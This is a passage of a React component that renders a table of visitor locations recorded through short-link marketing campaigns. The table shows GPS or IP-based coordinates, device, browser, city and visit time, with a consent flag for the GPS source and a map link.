                <option key={l.slug} value={l.slug}>{l.name} ({l.slug})</option>
              ))}
            </select>
          </div>
        </div>

        {enrichedEvents.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2.5rem', color: '#64748b' }}>
            No coordinates recorded yet. Open a short link to test recording.
          </div>
        ) : (
          <div style={{ overflowX: 'auto' }}>
            <table>
              <thead>
                <tr>
                  <th>Campaign & Slug</th>
                  <th>Latitude</th>
                  <th>Longitude</th>
                  <th>Source</th>
                  <th>Device / Browser</th>
                  <th>Location Hint</th>
                  <th>Recorded At</th>
                  <th>Map</th>
                </tr>
              </thead>
              <tbody>
                {enrichedEvents.map((ev) => (
                  <tr key={ev.id}>
                    <td>
                      <div style={{ fontWeight: 600, color: '#f8fafc', fontSize: '0.95rem' }}>
                        {ev.campaign_name}
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', marginTop: '0.2rem' }}>
                        <span style={{ color: '#60a5fa', fontFamily: 'monospace', fontSize: '0.8rem' }}>
                          /{ev.slug}
                        </span>
                        {ev.platform && (
                          <span style={{
                            textTransform: 'capitalize',
                            background: '#1e293b',
                            color: '#94a3b8',
                            padding: '0.1rem 0.4rem',
                            borderRadius: '4px',
                            fontSize: '0.7rem'
                          }}>
                            {ev.platform}
                          </span>
                        )}
                        {ev.discount && (
                          <span style={{
                            background: '#064e3b',
                            color: '#34d399',
                            padding: '0.1rem 0.4rem',
                            borderRadius: '4px',
                            fontSize: '0.7rem',
                            fontWeight: 600
                          }}>
                            ₹{ev.discount} OFF
                          </span>
                        )}
                      </div>
                    </td>
                    <td style={{ fontFamily: 'monospace', fontWeight: 600, color: '#38bdf8' }}>
                      {ev.latitude?.toFixed(6)}
                    </td>
                    <td style={{ fontFamily: 'monospace', fontWeight: 600, color: '#38bdf8' }}>
                      {ev.longitude?.toFixed(6)}
                    </td>
                    <td>
                      <span style={{
                        padding: '0.2rem 0.5rem',
                        borderRadius: '4px',
                        fontSize: '0.75rem',
                        fontWeight: 600,
                        background: ev.gps_consent ? '#065f46' : '#1e3a8a',
                        color: ev.gps_consent ? '#34d399' : '#93c5fd'
                      }}>
                        {ev.gps_consent ? 'GPS' : 'IP'}
                      </span>
                    </td>
                    <td style={{ color: '#cbd5e1', fontSize: '0.85rem' }}>
                      {ev.device_type || 'Desktop'} · {ev.browser || 'Browser'}
                    </td>
                    <td style={{ color: '#94a3b8', fontSize: '0.85rem' }}>
                      {ev.city ? `${ev.city}, ${ev.country || ''}` : 'Approximate'}
                    </td>
                    <td style={{ color: '#94a3b8', fontSize: '0.85rem' }}>
                      {new Date(ev.visited_at).toLocaleString()}
                    </td>
                    <td>
                      <a
                        href={`https://www.google.com/maps?q=${ev.latitude},${ev.longitude}`}
                        target="_blank"
                        rel="noreferrer"
                        style={{ display: 'inline-flex', alignItems: 'center', gap: '0.3rem', color: '#60a5fa', fontSize: '0.85rem' }}
                      >
                        <MapPin size={14} /> View
                      </a>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
